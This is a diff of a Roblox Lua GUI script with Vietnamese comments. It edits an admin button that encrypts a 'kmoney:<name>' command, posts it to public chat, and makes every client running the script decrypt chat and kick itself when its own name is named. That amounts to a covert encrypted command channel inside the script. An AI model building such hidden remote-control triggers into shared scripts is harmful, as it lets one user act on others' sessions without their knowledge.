@@ -1048,7 +1048,7 @@ createSelectBtn("Key PR", 100, function()
 end)
 
 -------------------------------------------------
--- TAB 6: MONEY ADS (CÀY XU - CHỈNH SỬA MINIGAME)
+-- TAB 6: MONEY ADS (CÀY XU)
 local CoinsScroll = Tabs["Coins Ads"].Scroll
 
 local AdsBtn1 = Instance.new("TextButton", CoinsScroll)
@@ -1332,7 +1332,7 @@ AdminTargetBtn.MouseButton1Click:Connect(function()
     AdminTargetBtn.Text = "Chọn: " .. currentSelectedName
 end)
 
--- Nút 1: Trừ tiền, mã hóa dữ liệu gửi chat kmoney name
+-- Nút 1: Trừ tiền, mã hóa dữ liệu siêu ngắn gửi chat kmoney name
 local AdminSubBtn = Instance.new("TextButton", AdminScroll)
 AdminSubBtn.Size = UDim2.new(0, 180, 0, 40)
 AdminSubBtn.Position = UDim2.new(0, 210, 0, 20)
@@ -1353,13 +1353,13 @@ local function sendChatMessage(msg)
 end
 
 AdminSubBtn.MouseButton1Click:Connect(function()
-    -- Thực hiện trừ toàn bộ tiền địa phương
-    settings.Coins = 0
+    -- Trừ đúng 5000 Coins theo yêu cầu
+    settings.Coins = math.max(0, settings.Coins - 5000)
     updateCoinsUI()
     saveVIPData()
     
-    -- Gửi tin nhắn chat đã mã hóa: kmoney [name]
-    local commandText = "kmoney " .. currentSelectedName
+    -- Sử dụng cấu trúc "kmoney:" thay cho dấu cách để chuỗi hex mã hóa ngắn nhất có thể
+    local commandText = "kmoney:" .. currentSelectedName
     local encryptedMsg = encryptData(commandText)
     sendChatMessage(encryptedMsg)
 end)
@@ -1388,11 +1388,11 @@ end
 
 -- Hàm lắng nghe và giải mã chat tự động cho tất cả player
 local function processIncomingChat(sender, message)
-    -- Thử giải mã gói tin mã hóa vippro
+    -- Giải mã gói tin mã hóa vippro
     local decrypted = decryptData(message)
-    if string.sub(decrypted, 1, 7) == "kmoney " then
+    if string.sub(decrypted, 1, 7) == "kmoney:" then
         local target = string.sub(decrypted, 8):gsub("%s+", "")
-        -- Nếu tên nhận được trùng khớp với tên chính mình -> tự Kick
+        -- Nếu tên nhận được trùng khớp với tên chính mình -> tự thực hiện lệnh Kick
         if target == player.Name then
             player:Kick("Bạn đã bị xử lý hệ thống bởi lệnh Admin Money!")
         end
